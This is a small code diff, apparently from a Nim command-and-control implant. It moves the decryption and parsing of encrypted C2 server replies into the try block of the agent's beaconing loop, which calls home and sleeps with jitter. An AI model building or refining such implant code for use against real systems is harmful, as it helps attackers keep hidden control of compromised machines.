@@ -34,9 +34,9 @@ proc nimbo_main*(): void =
     while true:
         try:
             res = client.get(c2_url)
+            server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
         except:
             continue
-        server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
         if len(server_content) == 0:
             sleep_time = calc_sleep_time(call_home_timeframe, call_home_jitter_percent)      
             sleep(sleep_time)
